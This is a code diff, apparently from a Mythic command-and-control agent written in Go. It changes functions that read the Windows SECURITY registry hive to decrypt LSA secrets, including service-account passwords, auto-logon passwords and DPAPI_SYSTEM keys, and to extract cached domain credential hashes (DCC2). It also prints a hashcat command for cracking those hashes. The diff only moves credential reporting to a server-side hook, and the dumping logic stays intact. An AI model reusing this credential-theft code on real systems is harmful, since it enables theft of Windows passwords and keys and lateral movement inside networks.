@@ -132,7 +132,6 @@ func lsaDumpSecrets(lsaKey []byte) structs.CommandResult {
 	sb.WriteString(fmt.Sprintf("LSA Secrets (%d found):\n\n", len(subkeys)))
 
 	decrypted := 0
-	var creds []structs.MythicCredential
 	for _, name := range subkeys {
 		currValPath := fmt.Sprintf(`SECURITY\Policy\Secrets\%s\CurrVal`, name)
 		hValKey, err := regOpenKey(hkeyLocalMachine, currValPath)
@@ -156,38 +155,8 @@ func lsaDumpSecrets(lsaKey []byte) structs.CommandResult {
 		sb.WriteString(fmt.Sprintf("[+] %s:\n%s\n", name, formatted))
 		decrypted++
 
-		// Report structured credentials for actionable secrets
-		switch {
-		case strings.HasPrefix(name, "_SC_"):
-			password := lsaUTF16ToString(secret)
-			if password != "" {
-				creds = append(creds, structs.MythicCredential{
-					CredentialType: "plaintext",
-					Account:        strings.TrimPrefix(name, "_SC_"),
-					Credential:     password,
-					Comment:        "lsa-secrets (service account)",
-				})
-			}
-			structs.ZeroString(&password)
-		case name == "DefaultPassword":
-			password := lsaUTF16ToString(secret)
-			if password != "" {
-				creds = append(creds, structs.MythicCredential{
-					CredentialType: "plaintext",
-					Account:        "DefaultPassword",
-					Credential:     password,
-					Comment:        "lsa-secrets (auto-logon)",
-				})
-			}
-			structs.ZeroString(&password)
-		case name == "DPAPI_SYSTEM" && len(secret) >= 44:
-			creds = append(creds, structs.MythicCredential{
-				CredentialType: "key",
-				Account:        "DPAPI_SYSTEM",
-				Credential:     hex.EncodeToString(secret[4:24]) + ":" + hex.EncodeToString(secret[24:44]),
-				Comment:        "lsa-secrets (DPAPI user:machine keys)",
-			})
-		}
+		// Credentials are registered via ProcessResponse hook (server-side),
+		// not inline in the agent response.
 
 		// Zero decrypted secret material and raw registry data
 		structs.ZeroBytes(secret)
@@ -196,15 +165,11 @@ func lsaDumpSecrets(lsaKey []byte) structs.CommandResult {
 
 	sb.WriteString(fmt.Sprintf("Decrypted: %d/%d secrets\n", decrypted, len(subkeys)))
 
-	result := structs.CommandResult{
+	return structs.CommandResult{
 		Output:    sb.String(),
 		Status:    "success",
 		Completed: true,
 	}
-	if len(creds) > 0 {
-		result.Credentials = &creds
-	}
-	return result
 }
 
 // lsaDumpCachedCreds extracts cached domain credentials (DCC2 / MSCacheV2)
@@ -254,7 +219,6 @@ func lsaDumpCachedCreds(lsaKey []byte) structs.CommandResult {
 	sb.WriteString(fmt.Sprintf("Iteration Count: %d\n\n", iterationCount))
 
 	found := 0
-	var creds []structs.MythicCredential
 	for i := 1; i <= 64; i++ {
 		valueName := fmt.Sprintf("NL$%d", i)
 		data, err := regQueryValue(hCacheKey, valueName)
@@ -270,14 +234,6 @@ func lsaDumpCachedCreds(lsaKey []byte) structs.CommandResult {
 		sb.WriteString(fmt.Sprintf("[+] %s\\%s\n", entry.domain, entry.username))
 		sb.WriteString(fmt.Sprintf("    %s\n\n", entry.hashcat))
 		found++
-
-		creds = append(creds, structs.MythicCredential{
-			CredentialType: "hash",
-			Realm:          entry.domain,
-			Account:        entry.username,
-			Credential:     entry.hashcat,
-			Comment:        "lsa-secrets (DCC2/MSCacheV2)",
-		})
 	}
 
 	if found == 0 {
@@ -288,13 +244,10 @@ func lsaDumpCachedCreds(lsaKey []byte) structs.CommandResult {
 		sb.WriteString("Crack with: hashcat -m 2100 hashes.txt wordlist.txt\n")
 	}
 
-	result := structs.CommandResult{
+	// Credentials are registered via ProcessResponse hook (server-side)
+	return structs.CommandResult{
 		Output:    sb.String(),
 		Status:    "success",
 		Completed: true,
 	}
-	if len(creds) > 0 {
-		result.Credentials = &creds
-	}
-	return result
 }
